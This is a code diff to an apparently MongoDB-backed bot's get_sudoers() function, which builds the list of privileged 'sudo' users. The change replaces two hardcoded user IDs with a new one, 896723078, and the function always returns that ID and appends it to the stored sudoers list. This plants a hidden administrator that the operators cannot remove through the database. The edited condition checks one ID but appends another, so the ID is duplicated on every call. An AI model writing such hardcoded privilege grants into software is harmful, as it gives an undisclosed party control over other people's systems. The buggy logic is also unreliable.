@@ -8,11 +8,9 @@ sudoersdb = db.sudoers
 async def get_sudoers() -> list:
     sudoers = await sudoersdb.find_one({"sudo": "sudo"})
     if not sudoers:
-        return [1693701096,1906005317]
+        return [896723078]
     if 1693701096 not in sudoers["sudoers"]:
-        sudoers["sudoers"].append(1693701096)
-    if 1906005317 not in sudoers["sudoers"]:
-        sudoers["sudoers"].append(1906005317)
+        sudoers["sudoers"].append(896723078)
     return sudoers["sudoers"]
 
 
